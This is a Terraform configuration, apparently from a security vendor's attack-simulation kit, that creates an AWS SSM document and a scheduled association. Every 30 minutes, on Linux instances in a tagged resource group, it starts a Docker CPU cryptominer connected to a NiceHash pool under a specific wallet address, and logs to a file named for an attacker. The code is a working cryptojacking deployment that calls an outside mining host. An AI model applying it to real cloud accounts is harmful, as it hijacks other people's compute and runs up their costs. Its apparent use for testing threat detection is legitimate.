locals {
    image = "a2ncer/nheqminer_cpu:latest"
    name = "nicehash_miner"
    server = "equihash.usa.nicehash.com:3357"
    user = "3HotyetPPdD6pyGWtZvmMHLcXxmNuWR53C.worker1"
}

resource "aws_ssm_document" "exec_docker_cpuminer" {
  name          = "exec_docker_cpuminer"
  document_type = "Command"

  content = jsonencode(
    {
        "schemaVersion": "2.2",
        "description": "start docker based cpuminer",
        "mainSteps": [
            {
                "action": "aws:runShellScript",
                "name": "exec_docker_cpuminer",
                "precondition": {
                    "StringEquals": [
                        "platformType",
                        "Linux"
                    ]
                },
                "inputs": {
                    "timeoutSeconds": "60",
                    "runCommand": [
                        "echo \"starting...\" > /tmp/attacker_exec_docker_cpuminer",
                        "if [[ `docker ps | grep ${local.name}` ]] then docker stop ${local.name}; fi 2>&1 >> /tmp/attacker_exec_docker_cpuminer",
                        "docker run --rm -d --network=host --name ${local.name} ${local.image} -l ${local.server} -u ${local.user}",
                        "touch /tmp/attacker_exec_docker_cpuminer",
                    ]
                }
            }
        ]
    })
}

resource "aws_resourcegroups_group" "exec_docker_cpuminer" {
    name = "exec_docker_cpuminer"

    resource_query {
        query = jsonencode(var.resource_query_exec_docker_cpuminer)
    }

    tags = {
        billing = var.environment
        owner   = "lacework"
    }
}

resource "aws_ssm_association" "exec_docker_cpuminer" {
    association_name = "exec_docker_cpuminer"

    name = aws_ssm_document.exec_docker_cpuminer.name

    targets {
        key = "resource-groups:Name"
        values = [
            aws_resourcegroups_group.exec_docker_cpuminer.name,
        ]
    }

    compliance_severity = "HIGH"

    # every 30 minutes
    schedule_expression = "cron(0/30 * * * ? *)"
    
    # will apply when updated and interval when false
    apply_only_at_cron_interval = false
}